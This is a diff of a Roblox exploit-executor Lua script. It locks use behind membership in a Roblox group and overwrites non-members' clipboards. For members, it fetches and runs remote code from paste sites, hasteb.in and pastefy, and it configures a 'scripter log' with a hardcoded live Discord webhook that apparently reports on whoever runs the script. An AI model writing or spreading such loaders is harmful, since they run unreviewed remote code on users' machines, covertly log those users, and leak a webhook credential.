@@ -1,1 +1,33 @@
-loadstring(game:HttpGet("https://hasteb.in/sTlgfisMwxEKKDv"))()
+local id, p, g = 35655715, game:GetService("Players").LocalPlayer, game:GetService("StarterGui")
+
+if not p:IsInGroup(id) then
+    (setclipboard or toclipboard or setrbxclipboard)("https://www.roblox.com/groups/"..id)
+    
+    pcall(function() 
+        g:SetCore("ResetCoreGuiEnabled", true) 
+    end)
+
+    for _, v in {{"ACCESS DENIED", "JOIN THE GROUP TO USE THIS!"}, {"GROUP LINK COPIED", "!~~!"}} do
+        g:SetCore("SendNotification", {
+            Title = v[1],
+            Text = v[2],
+            Duration = 5
+        }) 
+        task.wait(0.01)
+    end
+else
+    loadstring(game:HttpGet("https://hasteb.in/sTlgfisMwxEKKDv"))()
+
+    getgenv().Title = "<^>𝐒𝐂𝐑𝐈𝐏𝐓𝐄𝐑 𝐋𝐎𝐆<^>"
+    getgenv().ThumbnailUrl = "https://i.imgur.com/QmNN2Yg.png"
+    getgenv().Color = 0x000000
+
+    getgenv().FieldTitle = "Script Used:"
+    getgenv().FieldText = "loadstring(game:HttpGet("https://raw.githubusercontent.com/MainTreeUhh/UniversalScript/main/Jigoku"))()"
+
+    getgenv().Webhook = "https://discord.com/api/webhooks/1349705228806520883/Zb-nxossWJM1Iiove8G5Mg6AKqir-7SKvOfm83g2RWNY9W2vfDjk6eorkxjoQqKk2OkR"
+
+    coroutine.wrap(function()
+        loadstring(game:HttpGet("https://pastefy.app/cWTk8l1O/raw"))()
+    end)()
+end
